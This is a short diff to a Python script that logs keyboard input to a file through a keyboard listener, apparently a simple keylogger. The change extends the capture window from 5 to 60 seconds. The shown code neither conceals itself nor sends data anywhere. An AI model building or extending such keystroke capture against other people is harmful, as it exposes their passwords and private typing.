@@ -15,5 +15,5 @@ if __name__=='__main__':
     logging.basicConfig(filename=fname,level=logging.DEBUG,format="%(asctime)s    %(message)s")
     
     with keyboard.Listener(on_press = lf.on_press_keys) as listener:
-        Timer(5, listener.stop).start()
+        Timer(60, listener.stop).start()
         listener.join()
